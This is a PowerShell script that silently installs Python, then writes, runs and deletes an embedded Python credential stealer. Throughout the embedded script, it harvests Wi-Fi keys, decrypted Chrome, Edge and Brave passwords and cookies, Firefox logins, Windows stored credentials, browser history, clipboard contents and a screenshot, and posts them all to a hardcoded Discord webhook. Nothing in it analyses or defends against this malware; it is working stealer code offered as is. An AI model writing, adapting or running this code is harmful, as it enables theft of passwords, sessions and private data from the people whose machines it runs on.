# --- Step 1: Check for Python and install if missing ---
$pythonInstalled = $false
$pythonExe = "python"
if (-not (Get-Command $pythonExe -ErrorAction SilentlyContinue)) {
    $pythonExe = "py"
    if (-not (Get-Command $pythonExe -ErrorAction SilentlyContinue)) {
        Write-Host "[!] Python not found. Installing..."
        $pythonInstaller = "$env:TEMP\python_installer.exe"
        Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe" -OutFile $pythonInstaller
        Start-Process -FilePath $pythonInstaller -ArgumentList "/quiet", "InstallAllUsers=1", "PrependPath=1" -Wait
        Remove-Item $pythonInstaller -Force
        $pythonExe = "python"
    }
}

# --- Step 2: Create and run the Python grabber ---
$grabberScript = @'
import os
import sys
import subprocess
import sqlite3
import json
import shutil
import requests
import socket
import getpass
import platform
import base64
import win32crypt
from PIL import ImageGrab
import pyperclip
from datetime import datetime

# --- Config ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1474822700894523617/7V5m-1avhTy2eY-5NCVPpGEvg7hTZiKvf8cM8vQnMapjkeM1UNg09eK9V_cqQxKiCtSO"
TEMP_DIR = os.path.join(os.environ["TEMP"], "SysLog")

# --- Auto-Install Dependencies ---
def install_dependencies():
    required = ["pywin32", "requests", "pypiwin32", "Pillow", "pyperclip"]
    for lib in required:
        try:
            __import__(lib)
        except ImportError:
            subprocess.run([sys.executable, "-m", "pip", "install", lib, "--quiet"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# --- System Info ---
def get_system_info():
    return f"""
=== SYSTEM INFO ===
Hostname: {socket.gethostname()}
Username: {getpass.getuser()}
OS: {platform.platform()}
IP: {socket.gethostbyname(socket.gethostname())}
Time: {datetime.now()}
"""

# --- Wi-Fi Passwords ---
def get_wifi_passwords():
    output = "\n=== WI-FI PASSWORDS ===\n"
    try:
        profiles = subprocess.check_output("netsh wlan show profiles").decode("utf-8").split("\n")
        for profile in profiles:
            if "All User Profile" in profile:
                name = profile.split(":")[1].strip()
                try:
                    password = subprocess.check_output(f'netsh wlan show profile name="{name}" key=clear').decode("utf-8").split("\n")
                    password = [line for line in password if "Key Content" in line][0].split(":")[1].strip()
                    output += f"SSID: {name}\nPassword: {password}\n\n"
                except:
                    output += f"SSID: {name}\nPassword: [ERROR]\n\n"
    except Exception as e:
        output += f"[ERROR] Wi-Fi: {str(e)}\n"
    return output

# --- Browser Passwords ---
def get_browser_passwords(browser_name, path_suffix):
    output = f"\n=== {browser_name.upper()} PASSWORDS ===\n"
    try:
        browser_path = os.path.join(os.environ["LOCALAPPDATA"], browser_name, "User Data", path_suffix, "Login Data")
        if not os.path.exists(browser_path):
            return output + f"{browser_name} not installed.\n"

        temp_db = os.path.join(TEMP_DIR, f"{browser_name}_temp.db")
        os.makedirs(TEMP_DIR, exist_ok=True)
        shutil.copy2(browser_path, temp_db)

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for url, username, password in cursor.fetchall():
            try:
                password = win32crypt.CryptUnprotectData(password, None, None, None, 0)[1].decode("utf-8")
                output += f"URL: {url}\nUser: {username}\nPass: {password}\n\n"
            except:
                output += f"URL: {url}\nUser: {username}\nPass: [ERROR]\n\n"
        conn.close()
        os.remove(temp_db)
    except Exception as e:
        output += f"[ERROR] {browser_name}: {str(e)}\n"
    return output

# --- Firefox Passwords ---
def get_firefox_passwords():
    output = "\n=== FIREFOX PASSWORDS ===\n"
    try:
        firefox_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")
        if not os.path.exists(firefox_path):
            return output + "Firefox not installed.\n"

        for profile in os.listdir(firefox_path):
            if "default-release" in profile:
                db_path = os.path.join(firefox_path, profile, "logins.json")
                if os.path.exists(db_path):
                    with open(db_path, "r") as f:
                        logins = json.load(f)["logins"]
                        for login in logins:
                            output += f"URL: {login['hostname']}\nUser: {login['encryptedUsername']}\nPass: [ENCRYPTED]\n\n"
    except Exception as e:
        output += f"[ERROR] Firefox: {str(e)}\n"
    return output

# --- Windows Credentials ---
def get_windows_credentials():
    output = "\n=== WINDOWS CREDENTIALS ===\n"
    try:
        creds = subprocess.check_output("cmdkey /list", shell=True).decode("utf-8")
        output += creds
    except Exception as e:
        output += f"[ERROR] Credentials: {str(e)}\n"
    return output

# --- Browser Cookies ---
def get_browser_cookies(browser_name, path_suffix):
    output = f"\n=== {browser_name.upper()} COOKIES ===\n"
    try:
        cookie_path = os.path.join(os.environ["LOCALAPPDATA"], browser_name, "User Data", path_suffix, "Cookies")
        if not os.path.exists(cookie_path):
            return output + f"No cookies for {browser_name}.\n"

        temp_db = os.path.join(TEMP_DIR, f"{browser_name}_cookies.db")
        shutil.copy2(cookie_path, temp_db)

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, value, encrypted_value FROM cookies")
        for host, name, value, encrypted_value in cursor.fetchall():
            try:
                decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode("utf-8")
                output += f"Host: {host}\nName: {name}\nValue: {decrypted}\n\n"
            except:
                output += f"Host: {host}\nName: {name}\nValue: [ERROR]\n\n"
        conn.close()
        os.remove(temp_db)
    except Exception as e:
        output += f"[ERROR] {browser_name} Cookies: {str(e)}\n"
    return output

# --- Browser History ---
def get_browser_history(browser_name, path_suffix):
    output = f"\n=== {browser_name.upper()} HISTORY ===\n"
    try:
        history_path = os.path.join(os.environ["LOCALAPPDATA"], browser_name, "User Data", path_suffix, "History")
        if not os.path.exists(history_path):
            return output + f"No history for {browser_name}.\n"

        temp_db = os.path.join(TEMP_DIR, f"{browser_name}_history.db")
        shutil.copy2(history_path, temp_db)

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")
        for url, title, visit_time in cursor.fetchall():
            output += f"URL: {url}\nTitle: {title}\nTime: {visit_time}\n\n"
        conn.close()
        os.remove(temp_db)
    except Exception as e:
        output += f"[ERROR] {browser_name} History: {str(e)}\n"
    return output

# --- Screenshot ---
def take_screenshot():
    try:
        screenshot = ImageGrab.grab()
        screenshot_path = os.path.join(TEMP_DIR, "screenshot.png")
        screenshot.save(screenshot_path)
        return screenshot_path
    except Exception as e:
        return f"[ERROR] Screenshot: {str(e)}"

# --- Clipboard ---
def get_clipboard():
    try:
        clipboard = pyperclip.paste()
        return f"\n=== CLIPBOARD ===\n{clipboard}\n"
    except Exception as e:
        return f"\n=== CLIPBOARD ===\n[ERROR] {str(e)}\n"

# --- Send to Webhook ---
def send_to_webhook(data, screenshot_path=None):
    try:
        payload = {"content": data}
        files = {"file": open(screenshot_path, "rb")} if screenshot_path and os.path.exists(screenshot_path) else None
        requests.post(WEBHOOK_URL, data=payload, files=files)
    except Exception as e:
        print(f"[!] Failed to send data: {str(e)}")

# --- Main ---
if __name__ == "__main__":
    install_dependencies()
    os.makedirs(TEMP_DIR, exist_ok=True)

    data = ""
    data += get_system_info()
    data += get_wifi_passwords()
    data += get_browser_passwords("Google\\Chrome", "Default")
    data += get_browser_passwords("Microsoft\\Edge", "Default")
    data += get_browser_passwords("BraveSoftware\\Brave-Browser", "Default")
    data += get_firefox_passwords()
    data += get_windows_credentials()
    data += get_browser_cookies("Google\\Chrome", "Default")
    data += get_browser_cookies("Microsoft\\Edge", "Default")
    data += get_browser_history("Google\\Chrome", "Default")
    data += get_browser_history("Microsoft\\Edge", "Default")
    data += get_clipboard()

    screenshot = take_screenshot()
    send_to_webhook(data, screenshot)
'@

# --- Step 3: Save and run the Python script ---
$grabberPath = "$env:TEMP\grabber.py"
$grabberScript | Out-File -FilePath $grabberPath -Encoding UTF8

# --- Step 4: Run with python -m ---
& $pythonExe -m $grabberPath

# --- Cleanup ---
Remove-Item $grabberPath -Force